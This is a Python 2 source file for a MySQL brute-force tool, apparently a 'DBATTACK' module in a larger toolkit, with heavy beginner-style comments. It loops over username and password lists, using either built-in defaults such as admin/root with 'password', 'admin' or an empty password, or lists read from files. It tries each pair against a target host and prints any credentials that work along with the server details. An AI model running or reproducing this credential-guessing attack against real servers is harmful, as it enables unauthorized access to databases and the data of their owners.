import sys

# First of all we try to import MySQLdb module. Because without this module script won't be work.
# Successful - continue.
# Fail - print Error message and stop work of script.
try:
    import MySQLdb
except:
    print """
Execution error:

  The Python library MySQLdb is not installed in your system.

  Please, install it before use this application.

"""
    sys.exit(1)

# Class MYSQLDB_SCANNER : inherits from the base class object. New-style Classes
# Mandatory and optional args can be identified with the __init__ method
class MYSQLDB_SCANNER(object):
    # Definitions of member class variables
    # These variables, will be called as self.xxx in the class methods
    # It's a coding error to declare these variables here
    # Normally, we declare an __init__ function (which is the class
    # constructor) and declare the variable as self.num= 10 etc....
    #
    # A better way to write this code would be :
    # def __init__(self):
    #     self.user_list = []
    #     self.pass_list = []
    #  ... etc ...

    user_list = []  # Attribute for stores users
    pass_list = []  # Attribute for stores passwords
 
    def mysql_connect(self, u, p, ip):
        """
        Method for connect to mysql server. Incoming params:
        :param u: string. Username
        :param p: string. Password
        :param ip: string. IP Address of mysql server
        """
        # Create exception.
        # try connect to server
        try:
            print "[+] Attempting Connection..."
            # creates a connection to the MySQL server
            db = MySQLdb.connect(user = u, passwd = p, host = ip, connect_timeout = 5)
            print "[+] Connection Successful!\n"
            print "[+] ----------------------------------------"
            print "[+] Username: ", u, "  Password: ", p
            print "[+] IP: ", ip
            # This method returns the MySQL server information verbatim as a string
            print "[+] Server Info: ", db.get_server_info()
            print "[+] ----------------------------------------"
            # Close connection.
            db.close()
            print "[-] Connection Closed\n"
            exit(0)
        # run exception if were caught any errors.
        except Exception:
            print "Access denied\n"
            print u, " | ", p
            print ip
            pass

    def usage(self):
        '''
        Method that shows information about how to use this tool.
        '''
        print "\nUsage:"
        print "\tmain.py DBATTACK [host]"
        print "\tmain.py DBATTACK [host] [word_list] [password_list]\n"

    def main(self, arg):
        '''
        Main method of the class.

        :param arg: list. arguments from stdin. In our case, this is arguments received from main.py wrapper.
        '''

        # Parse arguments.
        # Check that there is no empty arg.
        if(len(arg) == 1):
            # Show help if arg equal to -h or --help
            if arg[0] == '-h' or arg[0] == '--help':
                self.usage()
                sys.exit(0)
            # Initialize variables. This variables may be changed.
            else:
                print "[+] Setting up default credentials list\n"
                # initialize variables.
                self.user_list = ["admin", "administrator", "root"]
                self.pass_list = ["password", "admin", "", "locked"]
        # Reading data from file and inserting to list received data.
        elif(len(arg) == 3):
            # User data
            print "[+] Building word list\n"
            # Open file for read
            f = open(arg[1], 'r')
            for line in f.readlines():
                # Create list of usernames by provided list
                self.user_list.append(line)
            # Close it.
            f.close
            # Password data
            print "[+] Building password list\n"
            # Open file for read.
            f = open(arg[2], 'r')
            for line in f.readlines():
                self.pass_list.append(line)
            # Close it.
            f.close()
        # Exit if there are not arguments and show help about usage.
        else:
            self.usage()
            sys.exit(0)

        # Convert arg[0] to string
        ip_address = str(arg[0])

        # Here we iterate through two lists. List of usernames and passwords
        # Try to connect to mysql server using username and password.
        for x in self.user_list:
            for y in self.pass_list:
                self.mysql_connect(x, y, ip_address)

        print "\nScan Complete\n"